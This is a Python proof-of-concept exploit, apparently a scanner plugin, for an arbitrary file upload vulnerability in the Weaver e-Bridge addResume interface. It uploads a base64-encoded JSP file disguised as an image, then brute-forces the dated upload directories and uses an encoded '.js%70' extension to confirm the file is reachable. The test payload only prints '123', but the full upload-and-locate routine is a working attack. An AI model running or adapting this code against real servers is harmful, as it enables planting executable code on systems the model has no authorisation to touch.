import string
import random
import sys

import requests
import base64
from datetime import datetime
import itertools
import urllib3
import urllib


def generate_random_string(length=6):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))


def verify(url):
    relsult = {
        'name': '泛微云桥(e-Bridge)系统接口addResume存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    letters = string.ascii_uppercase
    combinations_two_letters = list(itertools.product(letters, repeat=2))
    combinations_two_letters_strings = [''.join(combo) for combo in combinations_two_letters]
    combinations_single_letter_strings = list(letters)
    all_combinations_strings = combinations_single_letter_strings + combinations_two_letters_strings

    now = datetime.now()
    time = now.strftime("%Y%m")

    data = base64.b64decode("PCVvdXQucHJpbnRsbigiMTIzIik7JT4=").decode()
    r = generate_random_string()
    name = r + ".jsp"

    boundary = '----WebKitFormBoundaryDOVhr5SwLI1wpry7'
    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="file"; filename=\"{name}\"\r\n'
        'Content-Type: image/png\r\n\r\n'
        f'{data}\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="file"; filename="2.jsp"\r\n'
        'Content-Type: image/png\r\n\r\n'
        '1\r\n'
        f'--{boundary}--\r\n'
    )
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Length': str(len(body))
    }
    header2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }
    vurl = urllib.parse.urljoin(url, "/wxclient/app/recruit/resume/addResume?fileElementld=111")
    try:
        response = requests.post(vurl, headers=headers, data=body)
        if response.status_code == 200 and "success" in response.text:

            print("Successful exploitation of vulnerabilities")
            print("Blasting path in progress .....")

            http = urllib3.PoolManager()
            for i in all_combinations_strings:
                path = url + "/upload/{}/{}/{}".format(time, str(i), r + ".js%70")
                # print(path)
                if http.request('GET', path, headers=header2).status == 200:
                    relsult['vulnerable'] = True
                    relsult['verify'] = path
                    break
        return relsult


    except:
        return relsult